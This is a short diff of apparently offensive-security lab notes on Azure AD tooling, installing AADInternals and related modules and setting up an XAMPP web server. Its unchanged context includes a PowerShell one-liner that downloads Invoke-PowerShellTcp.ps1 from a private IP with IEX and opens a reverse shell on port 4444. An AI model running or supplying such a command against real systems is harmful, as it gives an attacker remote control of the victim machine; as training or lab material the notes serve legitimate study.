@@ -21,17 +21,15 @@ Install-Module AzureADPreview -Force -Confirm -AllowClobber -Scope AllUsers
 
 A
 Install-Module AADInternals -Force -Confirm -AllowClobber -Scope AllUsers
+
+A
 ```
 
 ```
 Import-Module Az
 Import-Module AzureAD
 ```
-OR get AzureRT to download all modules automagically:
-```
-. .\AzureRT.ps1
-Import-ARTModules
-```
+
 
 Download:
 - XAMPP
@@ -49,6 +47,7 @@ Put in `C:\xampp\htdocs`:
 powershell "IEX (New-Object Net.Webclient).downloadstring('http://172.16.152.213/Invoke-PowerShellTcp.ps1');Power -Reverse -IPAddress 172.16.152.213 -Port 4444"
 ```
 
+* * * 
 * * * 
 addendum
 
